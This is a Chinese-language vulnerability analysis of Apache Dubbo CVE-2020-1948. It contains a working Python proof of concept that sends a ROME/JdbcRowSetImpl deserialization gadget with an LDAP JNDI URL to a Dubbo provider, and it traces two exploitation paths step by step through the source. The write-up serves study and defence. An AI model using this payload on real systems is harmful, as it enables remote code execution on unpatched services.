Apache Dubbo系列漏洞

CVE-2020-1948

漏洞通告

https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html

利用方式一

利用provider查找不存在的服务抛出异常时隐式调用toString方法作为入口点

python代码

from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient


if __name__ == '__main__':
    client = DubboClient('10.58.120.200', 20880)

    JdbcRowSetImpl = new_object(
        'com.sun.rowset.JdbcRowSetImpl',
        dataSource="ldap://10.58.120.200:1389/vg1wxo",
        strMatchColumns=["foo"]
    )
    JdbcRowSetImplClass = new_object(
        'java.lang.Class',
        name="com.sun.rowset.JdbcRowSetImpl",
    )
    toStringBean = new_object(
        'com.rometools.rome.feed.impl.ToStringBean',
        beanClass=JdbcRowSetImplClass,
        obj=JdbcRowSetImpl
    )

    resp = client.send_request_and_return_response(
        service_name='any_name',
        method_name='any_method',
        args=[toStringBean])

    print(resp)

漏洞分析

漏洞点在org.apache.dubbo.rpc.RpcInvocation#toString方法中的Arrays.toString(this.arguments)，其中的this.arguments是可控的

public String toString() {
    return "RpcInvocation [methodName=" + this.methodName + ", parameterTypes=" + Arrays.toString(this.parameterTypes) + ", arguments=" + Arrays.toString(this.arguments) + ", attachments=" + this.attachments + "]";
}

在org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol#getInvoker方法中下断点，首先在inv对象的attachments中获取path值，此处path字段是provider中一个不存在的服务名

再根据获取到的port，path等信息获取serviceKey字符串，再从exporterMap中根据serviceKey值获取exporter，如果exporter为空则抛出异常

在new RemotingException()的构造函数中进行了字符串与对象的拼接，其中包含inv对象。

当对象与字符串拼接时会隐式调用StringBuilder.append(obj)–>String.valueOf(obj)–>obj.toString方法

throw new RemotingException(channel, "Not found exported service: " + serviceKey + " in " + this.exporterMap.keySet() + ", may be version or group mismatch , channel: consumer: " + channel.getRemoteAddress() + " --> provider: " + channel.getLocalAddress() + ", message:" + inv);

多次强制步入到inv对象的append方法

进入valueOf方法

进入toString方法，来到org.apache.dubbo.rpc.RpcInvocation#toString方法，在Arrays.toString(this.arguments)中，参数是我们传入的对象数组

进入Arrays.toString()方法，内部循环遍历对象数组调用String.valueOf()方法，a[i]为ToStringBean对象

继续进入String.valueOf(a[i])方法，即将调用ToStringBean对象的toString方法

ToStringBean.toString方法中会遍历其所有getter方法，会调用到getDatabaseMetaData方法，最后实现jndi注入

利用方式二

利用org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)方法对传入的服务名、方法名、方法描述校验缺陷，攻击者可以构造恶意对象，利用dubbo的反序列化器实现反序列化

漏洞分析

在decode方法处下断点，首先根据this.serializationType获取序列化器

进入getSerialization方法，通过getSerializationById()方法根据id获取Serialization对象

进入getSerializationById()方法，从ID_SERIALIZATION_MAP中获取对象，id为2获取的对象是Hessian2Serialization

获取到Serialization对象后，调用deserialize方法反序列化，即创建一个Hessian2ObjectInput对象

再从Hessian2ObjectInput对象中依次读取dubbo版本，服务名path，方法名，方法描述符等值

接下来分别创建了对象数组args和类数组pts，再根据服务名path在注册的服务中查找服务

当serviceDescriptor为空，则根据方法描述符创建类数组对象赋值给pts，再创建以新的对象数组赋值给args，长度为pts类数组的长度，然后循环遍历args对象数组进行readObject反序列化对象

进入in.readObject方法

进入到com.alibaba.com.caucho.hessian.io.Hessian2Input#readObject(java.lang.Class, java.lang.Class<?>…)方法，根据tag值进入分支处理

此处tag值为72，首先根据exprctedClass获取获取Deserializer反序列化器

进入getDeserializer方法，首先在_staticDeserializerMap中获取，再在_cachedDeserializerMap中获取对应的反序列化器

获取到对应的反序列化器后，带调用readMap方法读取Map对象

来到MapDeserializer.readMap()方法，首先创建一个map对象，在调用doReadMap方法

在doReadMap方法中，循环从Hessian2Input输入流中读取键值对对象并HashMap.put()到map对象中

反序列化完键值对后进入put方法，key和value都是EqualsBean对象

由此便进入到ROME调用链，进入到ToStringBean.toString方法中，获取所有getter方法，最终通过getDatabaseMetaData()方法实现JNDI注入

https://lists.apache.org/thread/g129y1xjtcxswjj506pvzmlbzfvtmsqw
